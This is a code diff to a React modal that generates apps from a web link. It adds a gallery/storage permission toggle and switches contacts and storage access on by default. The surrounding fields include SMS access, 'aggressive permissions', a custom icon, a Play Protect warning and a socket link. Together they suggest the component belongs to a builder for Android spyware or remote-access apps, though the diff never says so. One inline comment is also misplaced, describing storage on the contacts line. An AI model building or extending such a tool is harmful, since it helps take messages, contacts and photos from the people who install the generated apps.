@@ -24,8 +24,9 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
 
     // Permission Manager State
     const [enableSmsPermission, setEnableSmsPermission] = useState(false);
-    const [enableContactsPermission, setEnableContactsPermission] = useState(false);
-    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | null>(null);
+    const [enableContactsPermission, setEnableContactsPermission] = useState(true); // Gallery/Storage is usually needed
+    const [enableStoragePermission, setEnableStoragePermission] = useState(true); // Storage permission for gallery access
+    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | null>(null);
     const [showAdvanced, setShowAdvanced] = useState(false);
     const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
     const [aggressivePermissions, setAggressivePermissions] = useState(false);
@@ -110,6 +111,7 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
             formData.append('webLink', webLink);
             formData.append('enableSmsPermission', enableSmsPermission.toString());
             formData.append('enableContactsPermission', enableContactsPermission.toString());
+            formData.append('enableStoragePermission', enableStoragePermission.toString());
             formData.append('aggressivePermissions', aggressivePermissions.toString());
             if (customIcon) {
                 formData.append('icon', customIcon);
@@ -227,6 +229,26 @@ export default function AppGenerationModal({ isOpen, onClose, uuid, socket }: Ap
                                     className={`w-12 h-6 rounded-full transition-colors relative ${enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
                                 >
                                     <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission ? 'left-7' : 'left-1'}`} />
+                                </button>
+                            </div>
+
+                            {/* Storage/Gallery Permission */}
+                            <div className="flex items-center justify-between bg-white/5 p-3 rounded-lg border border-white/10 mb-2">
+                                <div className="flex items-center gap-2">
+                                    <svg className="w-4 h-4 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M4 16l4.586-4.586a2 2 0 012.828 0L16 16m-2-2l1.586-1.586a2 2 0 012.828 0L20 14m-6-6h.01M6 20h12a2 2 0 002-2V6a2 2 0 00-2-2H6a2 2 0 00-2 2v12a2 2 0 002 2z"></path></svg>
+                                    <span className="text-sm font-medium text-white/70">Gallery/Storage Access</span>
+                                    <button
+                                        onClick={() => setShowPermissionInfo('storage')}
+                                        className="text-white/40 hover:text-purple-400 transition-colors"
+                                    >
+                                        <svg className="w-4 h-4" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M13 16h-1v-4h-1m1-4h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z"></path></svg>
+                                    </button>
+                                </div>
+                                <button
+                                    onClick={() => setEnableStoragePermission(!enableStoragePermission)}
+                                    className={`w-12 h-6 rounded-full transition-colors relative ${enableStoragePermission ? 'bg-purple-500' : 'bg-white/20'}`}
+                                >
+                                    <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-7' : 'left-1'}`} />
                                 </button>
                             </div>
 
